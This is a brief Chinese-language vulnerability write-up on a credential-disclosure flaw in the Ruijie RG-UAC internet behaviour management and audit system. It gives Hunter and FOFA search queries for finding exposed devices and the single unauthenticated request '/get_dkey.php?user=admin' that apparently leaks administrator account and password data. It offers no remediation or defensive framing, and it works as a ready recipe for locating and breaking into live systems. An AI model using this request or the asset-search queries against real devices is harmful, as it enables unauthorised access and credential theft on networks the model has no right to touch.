# 锐捷RG-UAC统一上网行为管理审计系统账号密码泄漏漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页

![1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c.png](./img/PWRvl7dZB_p9dP8f/1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c-803916.png)

# 四、漏洞复现
```plain
/get_dkey.php?user=admin
```

![1711942654983-81767f2d-af9a-4c55-a6bf-54ccc7d257aa.png](./img/PWRvl7dZB_p9dP8f/1711942654983-81767f2d-af9a-4c55-a6bf-54ccc7d257aa-619723.png)

![1711942773077-d328619f-9fe1-49f8-88bb-da5a39b5859e.png](./img/PWRvl7dZB_p9dP8f/1711942773077-d328619f-9fe1-49f8-88bb-da5a39b5859e-257062.png)



> 更新: 2024-06-24 11:42:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vfv3tndznm6x0igq>